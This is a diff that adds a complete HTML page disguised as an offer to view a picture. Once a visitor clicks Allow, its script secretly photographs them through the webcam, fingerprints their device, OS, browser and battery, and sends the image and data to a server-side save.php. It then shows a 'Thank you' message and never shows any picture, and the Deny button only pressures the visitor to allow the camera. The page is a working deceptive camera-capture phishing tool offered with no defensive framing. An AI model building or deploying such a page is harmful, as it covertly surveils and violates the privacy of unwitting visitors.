@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Device Capture</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <h2>Do you want to see this pic?</h2>
+    <button onclick="allow()">Allow</button>
+    <button onclick="deny()">Deny</button>
+
+    <script>
+        let deviceInfo = {
+            device: "Unknown",
+            os: "Unknown",
+            browser: "Unknown",
+            battery: "Not available"
+        };
+        
+        // Detect device and OS
+        let ua = navigator.userAgent;
+        
+        if (/iPhone|iPad|iPod/i.test(ua)) {
+            deviceInfo.device = "iPhone/iPad";
+            deviceInfo.os = "iOS";
+        } else if (/Android/i.test(ua)) {
+            deviceInfo.device = "Android Phone";
+            deviceInfo.os = "Android";
+        } else if (/Windows/i.test(ua)) {
+            deviceInfo.device = "Windows PC";
+            deviceInfo.os = "Windows";
+        } else if (/Mac/i.test(ua)) {
+            deviceInfo.device = "Mac PC";
+            deviceInfo.os = "macOS";
+        } else if (/Linux/i.test(ua)) {
+            deviceInfo.device = "Linux PC";
+            deviceInfo.os = "Linux";
+        }
+        
+        // Detect browser
+        if (ua.includes("Chrome") && !ua.includes("Edg")) deviceInfo.browser = "Chrome";
+        else if (ua.includes("Firefox")) deviceInfo.browser = "Firefox";
+        else if (ua.includes("Safari") && !ua.includes("Chrome")) deviceInfo.browser = "Safari";
+        else if (ua.includes("Edg")) deviceInfo.browser = "Edge";
+        else deviceInfo.browser = "Other";
+        
+        // Get battery info
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function(batt) {
+                deviceInfo.battery = Math.floor(batt.level * 100) + "%";
+                if (batt.charging) deviceInfo.battery += " (Charging)";
+                else deviceInfo.battery += " (Not charging)";
+            });
+        }
+        
+        function allow() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    let video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    let canvas = document.createElement('canvas');
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        let image = canvas.toDataURL('image/jpeg');
+                        
+                        let data = {
+                            image: image,
+                            device: deviceInfo.device,
+                            os: deviceInfo.os,
+                            browser: deviceInfo.browser,
+                            battery: deviceInfo.battery
+                        };
+                        
+                        fetch('/save.php', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data)
+                        });
+                        
+                        document.body.innerHTML = '<h2>Thank you!</h2>';
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 1000);
+                })
+                .catch(() => {
+                    document.body.innerHTML = '<h2>Camera not found</h2>';
+                });
+        }
+        
+        function deny() {
+            document.body.innerHTML = '<h2>Please allow camera</h2>';
+        }
+    </script>
+</body>
+</html>
